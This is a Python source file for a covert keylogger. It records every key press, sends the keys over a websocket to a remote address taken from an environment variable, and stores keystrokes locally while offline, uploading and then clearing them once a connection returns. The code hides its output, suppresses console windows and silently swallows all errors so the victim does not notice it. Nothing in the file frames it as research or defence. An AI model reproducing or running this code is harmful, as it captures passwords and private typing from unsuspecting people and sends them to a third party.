import asyncio
from websockets import connect
from dotenv import load_dotenv
import os
import keyboard
import subprocess
from text_file_processors.formatting import process_key_message
import sys

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

load_dotenv()

websocket_url = os.getenv("WEBSOCKET_URL")

async def check_internet_connection():
    try:
        command = ["ping", "-c", "1", "google.com"] if os.name != "nt" else ["ping", "-n", "1", "google.com"]
        result = subprocess.run(
            command,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        return result.returncode == 0
    except Exception:
        return False

async def send_data(data):
    try:
        async with connect(websocket_url) as websocket:
            await websocket.send(data)
    except Exception:
        pass

async def on_key_event(event):
    try:
        key = event.name
        if await check_internet_connection():
            log_file = os.getenv("LOCAL_LOG_STORAGE_AREA")
            
            if os.path.exists(log_file):
                try:
                    with open(log_file, "r") as file:
                        content = file.read()
                        if content:
                            await send_data(content)
                            with open(log_file, "w") as file:
                                pass
                except Exception:
                    pass
            
            await send_data(key)
        else:
            with open(os.getenv("LOCAL_LOG_STORAGE_AREA"), "a") as file:
                process_key_message(key, os.getenv("LOCAL_LOG_STORAGE_AREA"))
    except Exception:
        pass

if __name__ == "__main__":
    try:
        keyboard.on_press(lambda event: asyncio.run(on_key_event(event)))
        keyboard.wait()
    except Exception:
        pass